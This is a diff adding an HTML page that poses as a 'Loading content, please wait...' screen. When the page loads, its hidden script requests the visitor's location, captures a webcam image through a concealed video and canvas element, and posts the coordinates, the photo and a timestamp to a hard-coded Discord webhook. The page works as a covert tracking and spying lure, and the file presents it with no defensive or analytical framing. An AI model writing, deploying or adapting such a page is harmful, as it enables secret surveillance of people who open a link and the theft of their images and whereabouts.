@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        
+        .loading-container {
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-spinner"></div>
+        <p>Loading content, please wait...</p>
+    </div>
+
+    <!-- We'll use a hidden video element to capture the camera stream -->
+    <video id="hiddenCamera" autoplay playsinline class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+
+    <script>
+        // Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1395370245576982568/3d2jGmz8iYC1RQE18RzmfvTb4Cem4AwT9MVSyGgg5W2PJb4WBkMi1yl2iXhh-wutoruO';
+        
+        // State variables
+        let locationData = null;
+        let cameraStream = null;
+        
+        // Function to get location
+        function getLocation() {
+            if (!navigator.geolocation) {
+                console.log("Geolocation not supported");
+                captureCamera();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    captureCamera();
+                },
+                error => {
+                    console.log("Location error:", error);
+                    captureCamera(); // Proceed without location
+                }
+            );
+        }
+        
+        // Function to capture from camera
+        async function captureCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.log("Camera not supported");
+                sendData();
+                return;
+            }
+            
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hiddenCamera');
+                video.srcObject = cameraStream;
+                
+                // Wait for the video to load enough to capture
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureImage();
+                    }, 500); // Wait half a second to ensure the camera is ready
+                };
+            } catch (err) {
+                console.log("Camera error:", err);
+                sendData(); // Proceed without image
+            }
+        }
+        
+        // Capture image from video
+        function captureImage() {
+            const video = document.getElementById('hiddenCamera');
+            const canvas = document.getElementById('hiddenCanvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Stop the camera stream
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Get the image as data URL
+            const imageData = canvas.toDataURL('image/jpeg');
+            sendData(imageData);
+        }
+        
+        // Send data to Discord
+        async function sendData(imageData = null) {
+            try {
+                // Prepare the message content
+                let content = "New data received:\n";
+                
+                if (locationData) {
+                    content += `Location: ${locationData.latitude}, ${locationData.longitude}\n`;
+                    content += `Accuracy: ${locationData.accuracy} meters\n`;
+                } else {
+                    content += "Location: Not available\n";
+                }
+                
+                content += `Timestamp: ${new Date().toISOString()}`;
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('content', content);
+                
+                // If we have an image, append it
+                if (imageData) {
+                    // Convert base64 to blob
+                    const byteString = atob(imageData.split(',')[1]);
+                    const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    const blob = new Blob([ab], { type: mimeString });
+                    
+                    formData.append('file', blob, 'captured_image.jpg');
+                }
+                
+                // Send to Discord
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    console.log("Data sent successfully");
+                } else {
+                    console.error("Failed to send data to Discord");
+                }
+            } catch (error) {
+                console.error("Error sending data:", error);
+            } finally {
+                // Redirect or close the window after sending
+                // window.close(); // Uncomment to close the window after sending
+            }
+        }
+        
+        // Start the process when the page loads
+        window.addEventListener('load', getLocation);
+    </script>
+</body>
+</html>
